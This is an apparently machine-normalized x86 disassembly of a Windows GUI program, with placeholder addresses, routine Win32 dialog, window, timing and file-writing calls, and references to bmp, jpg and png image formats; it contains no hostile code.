jle r-xdata
mov edx [ ebp - 0x40 ]
mov [ edx + eax * 4 ] 0x0
inc eax
cmp eax esi
jl r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x74 ]
mov [ rw-data ] 0x0
call sub_4480e0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp + 0x8 ]
push 0x1
lea edx [ ebp - 0x50 ]
push edx
push 0x2
push 0x53f
push edi
call [ GetDlgItem@IAT ]
push eax
call [ SetScrollInfo@IAT ]
push 0x0
push 0x0
push 0x0
push edi
mov [ rw-data ] 0x1
call sub_481c40
mov [ rw-data ] esi
push 0x0
push 0x0
push 0x0
push edi
call sub_481c40
mov eax [ rw-data ]
push 0x1
push 0x0
push esi
push eax
call sub_485220
add esp 0x10
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0x40 ]
mov ebx [ ebp - 0x54 ]
mov [ edi ] eax
mov [ edi + ebx * 4 - 0x4 ] eax
xor eax eax
test ebx ebx
jle r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x2c ]
lea esi [ ecx + edx * 2 ]
add esi eax
mov [ ebp - 0x1c ] 0x1
mov eax [ ebp - 0x54 ]
mov edi [ ebp - 0x34 ]
mov ebx [ ebp + 0xc ]
mov [ ecx + eax * 2 - 0x2 ] 0x0
mov eax [ ebp - 0x24 ]
add ecx edi
inc eax
dec ebx
cmp eax ebx
mov [ ebp - 0x24 ] eax
jl r-xdata
movzx edx [ ecx + esi * 2 + 0x2 ]
movzx eax [ ecx + esi * 2 ]
sub eax edx
cdq
xor eax edx
sub eax edx
cmp eax [ ebp - 0x20 ]
setle dl
dec dl
and edx eax
mov [ ecx + esi * 2 ] dl
inc esi
cmp esi edi
jl r-xdata
mov ecx [ rw-data ]
push eax
push ecx
lea edx [ ebp - 0x1a4 ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0x10
lea eax [ ebp - 0x1a4 ]
push eax
push edi
push 0xc
push 0x4ed
push esi
call [ SendDlgItemMessageA@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
fild [ ebp + 0xc ]
sub esp 0x8
fmul [ r--data ]
fstp [ esp ]
call sub_452510
add esp 0x8
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x20 ] eax
call sub_475090
xor esi esi
test ebx ebx
mov [ ebp - 0x4 ] 0xc
jle r-xdata
mov ecx [ edi + eax * 4 ]
mov [ ebp + eax * 4 - 0x41a4 ] ecx
inc eax
cmp eax ebx
jl r-xdata
cmp edi [ ebp - 0x24 ]
jle r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov esi [ ebp - 0x54 ]
mov edi [ ebp - 0x58 ]
mov edi [ ebp - 0x8c ]
mov esi [ edi ]
cmp edi esi
mov [ ebp + 0xc ] edi
je r-xdata
mov ecx [ edi + esi * 4 ]
xor eax eax
cmp ecx eax
jle r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x1c ]
dec ebx
cmp eax ebx
je r-xdata
mov eax ecx
cdq
mov ebx eax
xor ebx edx
sub ebx edx
mov eax edi
inc ebx
cdq
idiv ebx
mov edx [ ebp - 0x20 ]
lea edi [ ecx + edx ]
cmp edx edi
jg r-xdata
mov eax [ ebp - 0x34 ]
mov edx [ ebp - 0x1c ]
add esi eax
mov eax [ ebp + 0xc ]
inc edi
inc edx
dec eax
cmp edx eax
mov [ ebp - 0x1c ] edx
jl r-xdata
mov al [ esi - 0x2 ]
test al al
jne r-xdata
cmp edi esi
mov [ ebp + 0xc ] edi
je r-xdata
lea esp [ esp ]
inc esi
cmp esi ebx
jl r-xdata
mov ecx [ ebp - 0x20 ]
add ecx ecx
cmp esi ecx
jl r-xdata
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x54 ]
inc eax
dec edx
cmp eax edx
mov [ ebp - 0x20 ] eax
jl r-xdata
mov edi eax
lea eax [ ecx + ecx ]
mov ecx [ ebp - 0x34 ]
inc edi
sub ecx eax
mov [ ebp - 0x1c ] edi
add esi ecx
jmp r-xdata
mov ebx [ ebp - 0x40 ]
mov [ ebx + edx * 4 ] eax
inc edx
cmp edx edi
jle r-xdata
test ecx ecx
jg r-xdata
mov al [ esi + 0x2 ]
test al al
je r-xdata
mov eax [ edi ]
mov esi [ ebp - 0x58 ]
push edi
push eax
lea ecx [ ebp + 0xc ]
push ecx
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x3
call sub_4696b0
mov edx [ ebp - 0x8c ]
push edx
call j_sub_4b66ed#2
xor ecx ecx
add esp 0x4
cmp esi ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x88 ] ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_45f290
cmp [ ebp + 0xc ] esi
jne r-xdata
lea edi [ esi + 0x10 ]
cmp edi ebx
jle r-xdata
mov edx ebx
sub edx ecx
cmp esi edx
jg r-xdata
mov eax [ ebp - 0x1c ]
xor edi edi
xor ecx ecx
cmp eax ebx
jge r-xdata
mov eax edi
cdq
idiv [ ebp - 0x24 ]
mov edx ecx
neg edx
cmp edx eax
jg r-xdata
test ecx ecx
jl r-xdata
mov eax [ ebp - 0x40 ]
cmp eax ecx
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
cmp [ esi ] 0x1
jne r-xdata
mov eax [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
call sub_45f290
mov edi [ ebp - 0x24 ]
mov ecx [ ebp - 0x54 ]
or ebx 0xffffffff
cmp edi esi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x1c ] ebx
je r-xdata
mov eax [ ebp - 0x40 ]
mov ecx [ eax + esi * 4 ]
lea eax [ esi + 0x1 ]
cmp eax edi
mov edx esi
jge r-xdata
mov edi ebx
cmp ebx [ ebp + 0xc ]
jle r-xdata
dec ecx
add esi 0xfffffffe
mov eax edi
cdq
idiv [ ebp - 0x24 ]
cmp ecx eax
jg r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
dec [ esi ]
mov eax [ esi + 0x4 ]
dec [ eax + 0xc ]
mov edx [ ebp + 0xc ]
mov al [ edx + 0x15 ]
test al al
je r-xdata
mov esi [ ebp + 0xc ]
mov [ ebp - 0x30 ] ecx
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x2c ] edx
push ecx
lea edx [ ebp - 0x28 ]
push edx
lea ecx [ ebp - 0x90 ]
add esi 0x10
call sub_4680b0
mov edi [ ebp - 0x40 ]
mov ebx [ ebp - 0x40 ]
lea ebx [ ebx ]
mov eax ebx
cdq
sub eax edx
sar eax 0x1
mov edx eax
sub edx ecx
cmp edx esi
jge r-xdata
inc ecx
add esi 0x2
jmp r-xdata
mov ecx [ edx ]
mov al [ ecx + 0x15 ]
test al al
jne r-xdata
mov edx [ edx + 0x8 ]
jmp r-xdata
mov ecx [ esi ]
mov al [ ecx + 0x15 ]
test al al
jne r-xdata
mov edx [ esi + 0x8 ]
jmp r-xdata
inc eax
cmp eax edi
jl r-xdata
mov ecx [ ebx + eax * 4 ]
mov edx eax
add eax ecx
cmp esi eax
jge r-xdata
mov eax [ edx + 0x4 ]
mov cl [ eax + 0x15 ]
test cl cl
jne r-xdata
mov eax [ ecx + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov [ ebp + 0xc ] edx
mov eax [ esi + 0x4 ]
mov cl [ eax + 0x15 ]
test cl cl
jne r-xdata
mov eax [ ecx + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov al [ edi + 0x15 ]
test al al
mov ecx edi
je r-xdata
cmp ecx [ ebx + eax * 4 ]
jge r-xdata
mov ebx [ ebp - 0x54 ]
mov eax [ ebp - 0x8c ]
mov esi [ eax ]
cmp edx esi
jne r-xdata
lea ebx [ ebx ]
mov edx ecx
jmp r-xdata
mov edi edi
mov edi eax
lea ebx [ ebx ]
mov edx ecx
jmp r-xdata
lea esp [ esp ]
mov eax [ edi ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
jmp r-xdata
mov cl [ eax + 0x15 ]
test cl cl
jne r-xdata
mov edx eax
mov eax [ eax + 0x4 ]
mov cl [ eax + 0x15 ]
test cl cl
mov [ ebp + 0xc ] edx
je r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
mov cl [ eax + 0x15 ]
test cl cl
jne r-xdata
mov edx eax
mov eax [ eax + 0x4 ]
mov cl [ eax + 0x15 ]
test cl cl
je r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
mov eax [ edi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ edx + 0x10 ]
sub eax [ ecx + 0x10 ]
cdq
mov ecx eax
mov eax [ ebp - 0x20 ]
xor ecx edx
sub ecx edx
sub eax ecx
mov ecx [ ebp - 0x34 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jle r-xdata
mov edx eax
cmp edx [ eax ]
jne r-xdata
mov edx eax
cmp edx [ eax ]
jne r-xdata
cmp ecx [ eax ]
jne r-xdata
lea ebx [ ebx ]
mov al [ edi + 0x15 ]
test al al
je r-xdata
mov [ ebp - 0x34 ] eax
mov al [ esi + 0x15 ]
test al al
mov ecx esi
je r-xdata
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ edi ]
mov al [ ecx + 0x15 ]
test al al
jne r-xdata
mov edi [ edi + 0x8 ]
jmp r-xdata
mov eax [ esi ]
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov ecx [ esi + 0x8 ]
jmp r-xdata
mov ecx eax
mov eax [ edi + 0x4 ]
mov cl [ eax + 0x15 ]
test cl cl
jne r-xdata
mov eax [ ecx + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov eax [ ebp - 0x8c ]
cmp edi [ eax ]
jne r-xdata
mov eax [ esi + 0x4 ]
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov edx [ ecx + 0x10 ]
mov al [ edi + 0x15 ]
test al al
mov [ ebp - 0x1c ] edx
mov ecx edi
je r-xdata
lea ebx [ ebx ]
mov edi ecx
jmp r-xdata
mov edi edi
mov al [ esi + 0x15 ]
test al al
mov edx esi
je r-xdata
cmp [ ebp - 0x1c ] 0xffffffff
je r-xdata
lea ecx [ ecx ]
mov ecx eax
mov eax [ ecx + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
mov eax [ edi ]
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov ecx [ edi + 0x8 ]
jmp r-xdata
mov cl [ eax + 0x15 ]
test cl cl
jne r-xdata
mov edi eax
mov eax [ eax + 0x4 ]
mov cl [ eax + 0x15 ]
test cl cl
je r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
mov eax 0x55555556
imul [ ebp - 0x20 ]
mov eax [ ebp - 0x34 ]
mov ecx edx
shr ecx 0x1f
add edx ecx
cmp eax edx
jge r-xdata
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov ecx eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
jmp r-xdata
mov eax [ edi + 0x4 ]
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov eax [ ebp - 0x20 ]
mov ebx [ ecx + 0x10 ]
mov ecx [ ebp - 0x34 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
cmp ecx eax
jl r-xdata
mov edi eax
cmp edi [ eax ]
jne r-xdata
cmp [ ebp - 0x1c ] ebx
mov esi [ rw-data ]
jge r-xdata
mov ecx eax
cmp ecx [ eax ]
jne r-xdata
lea ebx [ ebx ]
mov ecx eax
mov eax [ ecx + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
mov ecx [ ebp - 0x1c ]
inc ecx
mov [ ebp - 0x24 ] ecx
jmp r-xdata
lea edx [ ebx + 0x1 ]
mov [ ebp - 0x24 ] edx
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov ecx eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
jmp r-xdata
test esi esi
mov edx [ rw-data ]
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
push 0x1
push ecx
mov eax esp
mov ecx rw-data
mov [ eax ] edx
call sub_41ce70
mov ecx [ rw-data ]
mov eax edx
sub eax esi
sub ecx esi
sar eax 0x2
sar ecx 0x2
cmp eax ecx
jae r-xdata
mov ecx eax
cmp ecx [ eax ]
jne r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx rw-data
call sub_41ce70
mov edx [ rw-data ]
mov ecx eax
sub ecx esi
sub edx esi
sar ecx 0x2
sar edx 0x2
cmp ecx edx
jae r-xdata
mov eax [ ebp + 0xc ]
push eax
push rw-data
lea ecx [ ebp - 0x24 ]
push ecx
push 0x1
push edx
mov esi edx
call sub_420d80
add esp 0x14
add esi 0x4
mov [ rw-data ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
push ecx
push rw-data
lea edx [ ebp - 0x24 ]
push edx
push 0x1
push eax
mov esi eax
call sub_420d80
add esp 0x14
add esi 0x4
mov [ rw-data ] esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov esi [ rw-data ]
sub eax ebx
cdq
xor eax edx
sub eax edx
dec eax
test esi esi
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
je r-xdata
sub_499a98
lea ecx [ ebp - 0x58 ]
call sub_40a3b0
lea ecx [ ebp - 0x44 ]
call sub_462cf0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_499fef
push es
add eax [ esi ]
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add al 0x5
nop
nop
nop
nop
nop
nop
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_4c1735
push eax
mov eax 0x1d94
mov [ fs : 0x0 ] esp
call sub_4b6180
push ebx
push ebp
push esi
push edi
push 0xd50
call sub_4b573e
add esp 0x4
mov [ esp + 0xdc ] eax
test eax eax
mov [ esp + 0x1dac ] 0x0
je r-xdata
xor eax eax
mov [ esp + 0x38 ] eax
jmp r-xdata
mov ecx eax
call sub_43fd90
test eax eax
mov [ esp + 0x38 ] eax
je r-xdata
mov [ esp + 0x180 ] eax
mov eax [ esp + 0x1db4 ]
cmp [ eax + 0x4 ] 0x1
mov [ esp + 0x1dac ] 0x1
je r-xdata
inc [ eax + 0xd48 ]
mov esi [ esp + 0x38 ]
test esi esi
mov [ esp + 0x1dac ] 0xffffffff
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov ecx [ esp + 0x1da4 ]
pop edi
pop esi
pop ebp
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x1da0
retn
dec [ esi + 0xd48 ]
jne r-xdata
push 0x64
mov [ rw-data ] 0x0
call [ Sleep@IAT ]
call [ timeGetTime@IAT ]
mov esi [ esp + 0x1db4 ]
mov ecx [ esi ]
push 0xfffffff0
push ecx
call [ GetWindowLongA@IAT ]
mov eax [ esi ]
lea edx [ esp + 0xec ]
push edx
push eax
call [ GetClientRect@IAT ]
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
push 0x3
call esi
mov eax [ esp + 0xf4 ]
mov edx [ esp + 0xec ]
mov ecx [ esp + 0xf0 ]
sub eax edx
mov [ esp + 0x8c ] eax
mov eax [ esp + 0xf8 ]
sub eax ecx
mov ecx rw-data
mov [ esp + 0x90 ] eax
call sub_404310
mov al [ rw-data ]
test al al
je r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov esi [ rw-data ]
push esi
call sub_45b5d0
add esp 0x4
cmp esi 0x1d
mov [ esp + 0x48 ] eax
mov [ esp + 0x27 ] 0x0
jne r-xdata
mov ecx rw-data
call sub_401420
jmp r-xdata
cmp esi 0xc
jl r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x1db4 ]
cmp [ ecx + 0x4 ] 0x1
jne r-xdata
mov ebp [ rw-data ]
lea eax [ esi - 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
cmp esi 0xf
lea edx [ eax + eax * 2 ]
mov ebp [ edx * 4 + rw-data ]
mov [ esp + 0x60 ] ebp
je r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
mov ebp edx
jmp r-xdata
xor ebp ebp
jmp r-xdata
cmp esi 0x1d
je r-xdata
mov eax [ rw-data ]
lea ebx [ eax + eax * 2 ]
shl ebx 0x2
test ebx ebx
mov [ esp + 0x58 ] ebx
jle r-xdata
mov [ esp + 0x27 ] 0x1
jmp r-xdata
cmp esi 0x1b
je r-xdata
mov [ esp + 0x60 ] ebp
mov ebx [ esp + 0x48 ]
imul ebx ebx 0x12c
mov eax [ ebx + rw-data ]
test al 0xf
mov [ esp + 0x10 ] ebx
je r-xdata
cmp esi 0xb
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov [ esp + 0x30 ] eax
lea eax [ ecx + ebx ]
mov cl [ esp + 0x27 ]
test cl cl
mov [ esp + 0x28 ] eax
je r-xdata
add ebx 0x4
mov [ esp + 0x58 ] ebx
mov edi [ rw-data ]
cmp edi ebp
jge r-xdata
cmp esi 0x17
jne r-xdata
mov ecx rw-data
call sub_401420
mov [ esp + 0xd0 ] 0xf
mov [ esp + 0xcc ] 0x0
mov [ esp + 0xbc ] 0x0
cmp esi 0x1d
mov [ esp + 0x1dac ] 0x5
je r-xdata
cmp esi 0xc
jl r-xdata
mov edx [ rw-data ]
lea ecx [ edx + eax ]
mov eax [ rw-data ]
cdq
idiv ecx
imul eax [ rw-data ]
xor eax eax
jmp r-xdata
test al 0x20
je r-xdata
cmp esi 0xb
je r-xdata
mov eax esi
and al 0x3
cmp al 0x1
jle r-xdata
cmp eax edi
jge r-xdata
lea eax [ ebp - 0x1 ]
mov [ rw-data ] eax
cmp eax ebp
mov [ rw-data ] eax
jl r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
mov edi 0x10
cmp eax edi
jae r-xdata
mov cl [ ebx + rw-data ]
test cl cl
lea eax [ ebx + rw-data ]
je r-xdata
lea eax [ esi - 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
push eax
call sub_421f40
mov esi eax
push esi
call sub_457f40
mov edi [ lstrcpynA@IAT ]
add esp 0x8
push eax
push esi
lea ecx [ esp + 0x200 ]
push ecx
call edi
push esi
call sub_457f40
add esp 0x4
mov ebp 0xfffffffd
push esi
sub ebp eax
call [ lstrlenA@IAT ]
add ebp eax
push ebp
push esi
call sub_457f40
add esp 0x4
add eax esi
push eax
lea edx [ esp + 0x304 ]
push edx
call edi
mov eax [ rw-data ]
mov esi [ lstrcatA@IAT ]
and eax 0x3
cmp al 0x3
jne r-xdata
mov edx [ esp + 0x60 ]
cmp eax edx
mov ecx [ rw-data ]
mov ebp eax
mov [ esp + 0x1c ] ebp
jge r-xdata
mov eax edi
mov eax edx
lea esi [ eax + 0x1 ]
lea ecx [ ecx ]
mov edx rw-data
push eax
lea ecx [ esp + 0xbc ]
call sub_402510
mov edi 0x10
jmp r-xdata
test [ ebx + rw-data ] 0x20
je r-xdata
push r--data
lea ecx [ esp + 0x300 ]
push ecx
call esi
cmp ebp edi
jne r-xdata
cmp [ ecx + ebp ] 0x0
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ esp + 0xc0 ]
call sub_401e80
cmp [ esp + 0xd0 ] edi
mov eax [ esp + 0xbc ]
jae r-xdata
push r--data
lea eax [ esp + 0x1fc ]
push eax
call esi
lea ecx [ esp + 0x2fc ]
push ecx
lea edx [ esp + 0x1fc ]
push edx
call esi
lea eax [ esp + 0x1f8 ]
push eax
lea ecx [ esp + 0xbc ]
call sub_402510
mov ebp [ esp + 0x60 ]
jmp r-xdata
mov cl [ ebx + rw-data ]
test cl cl
lea eax [ ebx + rw-data ]
je r-xdata
cmp ebp edx
jne r-xdata
lea edi [ ebp + 0x1 ]
mov [ rw-data ] edi
mov [ esp + 0x1c ] ebp
inc ebp
cmp ebp edx
jl r-xdata
push eax
call sub_457f40
add esp 0x4
test eax eax
jle r-xdata
lea eax [ esp + 0xbc ]
test [ ebx + rw-data ] 0x10
mov edi [ esp + 0x48 ]
jne r-xdata
push eax
lea edx [ esp + 0x1fc ]
push edx
call [ lstrcpyA@IAT ]
mov eax [ esp + 0x1db4 ]
mov [ ecx + ebp ] 0x1
mov ecx [ eax ]
push ecx
call [ GetDC@IAT ]
fild [ rw-data ]
push ecx
mov [ esp + 0x38 ] eax
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov edx [ esp + 0xf8 ]
fild [ rw-data ]
sub edx [ esp + 0xf0 ]
fmul [ rw-data ]
sub edx eax
mov eax edx
cdq
sub eax edx
fstp [ esp ]
mov esi eax
sar esi 0x1
mov [ esp + 0x78 ] esi
call sub_452500
mov ecx [ esp + 0xfc ]
sub ecx [ esp + 0xf4 ]
sub ecx eax
mov eax ecx
cdq
sub eax edx
sar eax 0x1
xor edx edx
add esp 0x4
cmp esi edx
mov [ esp + 0x7c ] eax
jge r-xdata
cmp eax edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x5c
push 0x1
lea ecx [ esp + 0xc0 ]
call sub_4017f0
mov eax r--data
lea edx [ eax + 0x1 ]
cmp edi 0x4
je r-xdata
cmp eax edx
jge r-xdata
mov [ esp + 0x74 ] edx
mov ebp edi
cmp ebp eax
mov [ esp + 0x1c ] ebp
jge r-xdata
mov ecx rw-data
mov [ rw-data ] edx
call sub_401420
jmp r-xdata
mov ecx [ rw-data ]
cmp ecx edi
mov eax [ rw-data ]
mov esi eax
jae r-xdata
cmp [ rw-data ] 0x1d
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0xc0 ]
call sub_401cc0
push r--data
lea ecx [ esp + 0xbc ]
call sub_402010
mov ecx [ ebx + rw-data ]
and ecx 0xf
lea edx [ esp + ecx * 4 + 0x170 ]
push edx
lea ecx [ esp + 0xbc ]
mov [ esp + 0x178 ] 0x706d62
mov [ esp + 0x17c ] 0x67706a
mov [ esp + 0x180 ] 0x676e70
call sub_402010
jmp r-xdata
mov ecx [ rw-data ]
cmp ecx edx
jle r-xdata
mov [ esp + 0x7c ] edx
dec eax
cmp ebp eax
je r-xdata
cmp [ ecx + ebp ] 0x0
je r-xdata
push eax
call sub_457f40
add esp 0x4
add eax esi
mov ecx eax
lea esi [ ecx + 0x1 ]
mov esi rw-data
mov eax esi
mov ecx [ rw-data ]
cmp ecx edi
mov eax [ rw-data ]
mov esi eax
jae r-xdata
cmp edi 0x4
mov ecx rw-data
je r-xdata
mov eax [ rw-data ]
push r--data
push eax
call [ SetWindowTextA@IAT ]
mov ecx rw-data
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
call sub_401420
mov al [ rw-data ]
test al al
jne r-xdata
xor edi edi
mov eax ebp
cdq
idiv ecx
mov edi eax
jmp r-xdata
mov [ rw-data ] edx
lea edx [ ebp + 0x1 ]
mov [ esp + 0x1c ] ebp
inc ebp
cmp ebp eax
jl r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
push eax
lea ecx [ esp + 0xc0 ]
call sub_401cc0
push eax
call sub_457f40
add esp 0x4
add eax esi
push eax
lea ecx [ esp + 0xbc ]
call sub_402010
jmp r-xdata
mov esi rw-data
mov eax esi
cmp [ esp + 0xd0 ] 0x10
mov eax [ esp + 0xbc ]
jae r-xdata
mov ecx rw-data
imul ecx edi
mov esi ebp
sub esi ecx
lea esi [ edi + 0x1 ]
imul esi ecx
sub esi ebp
dec esi
jmp r-xdata
test [ rw-data ] 0x1
mov [ esp + 0x3c ] edi
je r-xdata
mov ecx [ esp + 0xcc ]
cmp [ ecx + eax - 0x1 ] 0x3a
jne r-xdata
lea eax [ esp + 0xbc ]
cmp [ esp + 0xd0 ] edi
mov eax [ esp + 0xbc ]
jae r-xdata
mov edx [ ebx + rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0xf
push 0x0
dec edx
push edx
push eax
call sub_43d820
mov esi eax
test [ ebx + rw-data ] 0x10
mov [ esp + 0x78 ] esi
jne r-xdata
lea eax [ esp + 0xbc ]
mov [ esp + 0x48 ] edi
mov [ esp + 0x84 ] esi
xor edi edi
mov eax [ rw-data ]
xor edi edi
cmp eax 0x1
jg r-xdata
fild [ rw-data ]
push ecx
mov [ esp + 0x48 ] esi
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ rw-data ]
mov [ esp + 0xb4 ] eax
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov [ esp + 0x64 ] eax
mov eax [ esp + 0x4c ]
imul eax eax 0x12c
mov ecx [ eax + rw-data ]
add esp 0x4
test ecx ecx
jne r-xdata
lea eax [ ecx - 0x1 ]
cmp eax ecx
ja r-xdata
cmp esi 0x1
jne r-xdata
cmp edi 0x4
jne r-xdata
cmp edx 0xc
mov [ esp + 0x5c ] edi
jge r-xdata
mov [ esp + 0x14 ] edi
cmp [ rw-data ] 0x1
jg r-xdata
mov [ esp + 0x30 ] edi
sub eax ecx
push 0x0
push eax
lea ecx [ esp + 0xc0 ]
call sub_4017f0
push 0xffffffff
push eax
lea ecx [ esp + 0xc0 ]
call sub_401ba0
jmp r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
cmp [ esp + 0xd0 ] 0x10
mov eax [ esp + 0xbc ]
jae r-xdata
push sub_4480e0
push sub_401360
push 0x20
push 0x1c
lea eax [ esp + 0x990 ]
push eax
call sub_4b6874
test [ rw-data ] 0x1
mov [ esp + 0x1dac ] 0x3
jne r-xdata
mov esi [ rw-data ]
cmp esi edi
jne r-xdata
lea edx [ eax - 0x1 ]
imul eax [ rw-data ]
imul edx [ rw-data ]
add edx eax
mov [ esp + 0x10 ] edx
push ecx
fild [ esp + 0x14 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov ecx [ esp + 0x90 ]
sub ecx eax
mov eax ecx
cdq
sub eax edx
mov edx [ rw-data ]
mov esi eax
mov eax [ rw-data ]
add edx ebx
imul edx eax
sar esi 0x1
dec eax
imul eax [ rw-data ]
add edx eax
mov [ esp + 0x14 ] edx
mov [ esp + 0x78 ] esi
fild [ esp + 0x14 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov ecx [ esp + 0x94 ]
sub ecx eax
mov eax ecx
cdq
sub eax edx
sar eax 0x1
add esp 0x4
cmp esi edi
mov [ esp + 0x7c ] eax
jge r-xdata
mov [ esp + 0x28 ] edi
cmp [ esp + 0xd0 ] 0x10
mov [ rw-data ] 0x0
mov [ esp + 0x1dac ] 0x1
jb r-xdata
cmp esi 0x1
jne r-xdata
xor ebx ebx
push ebx
push 0x80
push 0x3
push ebx
push ebx
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
lea eax [ esp + 0xbc ]
mov eax [ rw-data ]
cmp eax 0x1d
jne r-xdata
or [ rw-data ] 0x1
mov [ rw-data ] edi
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
cmp eax edi
jge r-xdata
mov [ esp + 0x74 ] edi
